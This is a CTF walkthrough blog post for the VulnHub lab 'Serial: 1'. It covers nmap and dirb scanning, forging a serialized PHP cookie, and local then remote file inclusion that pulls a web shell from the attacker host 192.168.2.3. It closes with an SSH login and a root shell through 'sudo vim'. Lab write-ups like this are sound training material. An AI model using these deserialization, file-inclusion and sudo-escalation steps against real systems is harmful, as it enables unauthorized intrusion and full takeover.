<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Serial: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/serial-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-09-01T05:52:48+00:00">September 1, 2019</time><time class="updated" datetime="2025-06-10T20:11:13+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to take a new challenge, Serial: 1 The credit for making this VM machine goes to “<a href="https://twitter.com/@sk4pwn">sk4</a>” and it is a boot2root challenge where we have to root the server to complete the challenge. You can download this VM <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/serial-1,349/">here</a></strong></span></p>
<p><span style="color: #000000;"><strong>Security Level</strong>: Beginner/ Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">NMAP</span></li>
<li><span style="color: #000000;">Dirb</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Browsing the website</span></li>
<li><span style="color: #000000;">Burpsuite </span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">Analyze and change PHP code to get</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Sudo permission for vim command</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<p><span style="color: #000000;">First thing first, scan the vulnerable machine using Nmap.</span></p>
<pre class="lang:default decode:true ">nmap -p- -A 192.168.2.6</pre>
<p><span style="color: #000000;">Here we got only two ports, 80 and 22.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rZodZm3tg0o/XWtWo3san-I/AAAAAAAAgXA/a9yZrhP8f1Ym5T_duI24TiO_QxmSL6yRQCLcBGAs/s1600/1.png"/></p>
<p><span style="color: #000000;">We browsed the website on port 80 and got the message hinting that we might get something in cookies.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-G1f6RXmnuiw/XWtWsU3WEvI/AAAAAAAAgXk/jVuPsDPBqJEUGhuHv6gy3R1qqYIHCZRygCLcBGAs/s1600/2.png"/></p>
<p><span style="color: #000000;">When we intercepted the request, there was a very lengthy value for a cookie. The value for cookie <strong>user</strong> was a base64 encoded value.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-mrcpEI55XnM/XWtWuV9lFRI/AAAAAAAAgYA/rmgpm_0cuMAULCEiUVv7jTB6OoaWK-eLgCLcBGAs/s1600/3.png"/></p>
<p><span style="color: #000000;">After decoding the value gave us a username, we tried to change it to something else but not possible.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YagmkaiWzzE/XWtWvINutcI/AAAAAAAAgYE/b9iz8QvwJHsc6ECYkuqIFd0OOpXE-ZjqQCLcBGAs/s1600/4.png"/></p>
<p><span style="color: #000000;">For a moment, we kept it aside and tried to get all the available directories using dirb.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.2.6</pre>
<p><span style="color: #000000;">Here we found one interesting directory named backup.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-jummNA94CXc/XWtWvbg4-RI/AAAAAAAAgYI/PcDDw14SGkMXr_udcijaOgfsaRpVNEMbACLcBGAs/s1600/5.png"/></p>
<p><span style="color: #000000;">We visited the backup directory on the webserver and found a zip file over there.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YipWo6kqF-U/XWtWvimX29I/AAAAAAAAgYM/0yb8AvLXpsA0r_5ofgmYSDjdd69hm0nbACLcBGAs/s1600/6.png"/></p>
<p><span style="color: #000000;">We downloaded the zip file and extracted the contents and found three files.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rvQgDctQjzs/XWtWwAl_m0I/AAAAAAAAgYQ/fLLoPGAjeugWM7e3FpzRH3lmkhPFG2KvQCLcBGAs/s1600/7.png"/></p>
<p><span style="color: #000000;">Let’s check the contents of the files starting from</span></p>
<p><span style="color: #000000;"><span lang="EN-IN"> 1) </span><span lang="EN-IN">index.php</span></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-PZFwWu4flZk/XWtWwPNAqaI/AAAAAAAAgYU/SfTqVe2aklUufYy1P0yKtdTHWLYg7cIpgCLcBGAs/s1600/8.png"/></p>
<p><span style="color: #000000;">2) class.php</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-v1nwqcIEZh0/XWtWwdtbatI/AAAAAAAAgYY/FHq5Rmrv72EHDDf3mNMRwsxn-ghoOnNGQCLcBGAs/s1600/9.png"/></p>
<p><span style="color: #000000;">3) class.php</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-QCHX6R4tm4s/XWtWopVGJeI/AAAAAAAAgW8/OgHonFWhwdM5CtvH3XoPzxTFFQCA-5IggCLcBGAs/s1600/10.png"/></p>
<p><span style="color: #000000;">After carefully analysing the code of file <strong>index.php</strong> and <strong>user.class.php</strong>, we came to know that we can try to get base64 encoded value of cookie <strong>user</strong> by just adjusting a function call from index.php to user.class.php. So, we added one single line in the end to display the base64 value encoded in a similar format as the user cookie value but this time with another user i.e. admin.</span></p>
<pre class="lang:default decode:true">echo base64_encode(serialize(new User('admin')));</pre>
<p><span style="color: #000000;">  <img decoding="async" src="https://1.bp.blogspot.com/-ZJM5Y_m5Zgc/XWtWonC2IWI/AAAAAAAAgW4/l4Fb3N55DU8IIny4o0V3yl4Yb1jUkKLKQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now let’s try to run the PHP code and check the output of the same.</span></p>
<pre class="lang:default decode:true">php user.class.php</pre>
<p><span style="color: #000000;">We got a base64 encoded value which we will try to use as the value of user cookie.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-r5geP81jmho/XWtWprLV_dI/AAAAAAAAgXE/jUyL91MWP0olOw8usMzKPABUPIl0nq1aQCLcBGAs/s1600/12.png"/></p>
<p><span style="color: #000000;">Well, the base64 cookie value worked but nothing much helpful, so we started to look for something else. We checked the <strong>log.class.php</strong>, we found that the Log class is having an <strong><u>include</u></strong> function to include a log file but the parameter <strong>type_log</strong> is not assigned any value. We assigned the variable with the path of passwd file as the value.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-yr2gDdAaaoY/XWtWp4hE8FI/AAAAAAAAgXI/uqmy4jMaR_wm4GzneZuYRXsccD-EPKLUwCLcBGAs/s1600/13.png"/></p>
<p><span style="color: #000000;">Also alongside that, we made a small change in the user class, we replaced the function call of the Welcome class to the function call of the constructor of the Log class.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-L2P60q7lDNk/XWtWqL-0stI/AAAAAAAAgXM/EXkyzMY2y2E3hwdlPC4PNiSYQ-3W_w8UACLcBGAs/s1600/14.png"/></p>
<p><span style="color: #000000;">Now when we tried to run the user.class.php file again, we found that the passwd file was displayed and we got the base64 encoded value which we can use as the cookie.</span></p>
<pre class="lang:default decode:true">php user.class.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-52jJX3NpYb8/XWtWqTzEY8I/AAAAAAAAgXQ/HjQocgqOVR0VwMDLhZ9kiAvcWxovYjnkwCLcBGAs/s1600/15.png"/></p>
<p><span style="color: #000000;">When we tried the base64 encoded cookie value in the webpage, we got the passwd file from the target machine, confirming we have a file inclusion vulnerability.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-PzkWv8j-OPI/XWtWrAo0yuI/AAAAAAAAgXY/5VxTVVvPj6AJmj3VEd_1SdwPx4QY7nWKQCLcBGAs/s1600/16.png"/></p>
<p><span style="color: #000000;">Now that we have verified the presence of file inclusion vulnerability, we created a remote code execution file and started the python server.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-89FD0DL-SOc/XWtWrIWTw6I/AAAAAAAAgXU/xcsPcT6SvsoH0jNa0Xc-q14cBlQR8sdhQCLcBGAs/s1600/17.png"/></p>
<p><span style="color: #000000;">Now we edit the log class to change the file path variable to the URL of our shell.</span></p>
<pre class="lang:default decode:true">private $type_log = "http://192.168.2.3/shell.php"</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-HyaxsTGqovo/XWtWrVLb9sI/AAAAAAAAgXc/EMmnP1GAcpUz6ff_F2L8geMMZlCWX1qZQCLcBGAs/s1600/18.png"/></p>
<p><span style="color: #000000;">After putting the code in place, its time to get the cookie value to execute.</span></p>
<pre class="lang:default decode:true">php user.class.php</pre>
<p><strong><img decoding="async" src="https://1.bp.blogspot.com/-h-kb6XrF_JE/XWtWsIIQ-hI/AAAAAAAAgXg/3H_2mMc-6hki06jYIIUXbLzqNgGy-TQfgCLcBGAs/s1600/19.png"/></strong></p>
<p><span style="color: #000000;">When we used the cookie value and provided the cmd parameter with<strong> ifconfig</strong> command.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-519B6zQjtDQ/XWtWsSmZEjI/AAAAAAAAgXo/yasy4XF4ndgE6nXUBtULn2NLuQDENM6UACLcBGAs/s1600/20.png"/></p>
<p><span style="color: #000000;">While checking the contents, we found a file named credentials.txt.bak.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-nKwzhcL7qcc/XWtWtNw1PzI/AAAAAAAAgXs/PjXCWOgL_DI-UYt10MshKpKXL1iBiz21ACLcBGAs/s1600/21.png"/></p>
<p><span style="color: #000000;">We tried to check the contents and found something like a set of credentials, let’s try to use these credentials</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-CcWpHAJ7MaM/XWtWtNy42xI/AAAAAAAAgXw/k3VJ-QGCCfUNCbI2k_iOLB102cuWIQpiwCLcBGAs/s1600/22.png"/></p>
<p><span style="color: #000000;">We used the credentials for ssh and got access. While enumerating we found the first flag.</span></p>
<pre class="lang:default decode:true">ssh sk4@192.168.2.6
ls
cat flag.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vbBB3hkepb4/XWtWtBxLrKI/AAAAAAAAgX0/pjZ_xHmrrx8iMJuIEGEugVexfFvUITyuQCLcBGAs/s1600/23.png"/></p>
<p><span style="color: #000000;">Now we have to escalate the privilege, we tried to get sudo permissions for the current user. We found we have sudo permissions for vim editor.</span></p>
<pre class="lang:default decode:true ">sudo -l</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-EQPBoRh7gRc/XWtWtzGPo4I/AAAAAAAAgX4/m15NFU-M60E_HkIUjMgysyF8-BGoYsuDQCLcBGAs/s1600/24.png"/></p>
<p><span style="color: #000000;">We used privilege escalation through vim editor and got the root shell.</span></p>
<pre class="lang:default decode:true ">sudo vim
:!/bin/bash
cd /root
ls
cat fl4g.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-xN34_d7T33U/XWtWuvWo8eI/AAAAAAAAgX8/WnLWpx0Aww4ZyFCbNR18M3Eiq1lj94v6ACLcBGAs/s1600/25.png"/></p>
<p><span style="color: #000000;"><strong>Author: </strong>Deepanshu is a Certified Ethical Hacker, Security Researcher, Pentester and Trainer at Ignite Technologies. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/deepanshu-k-a4248b138/">here</a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
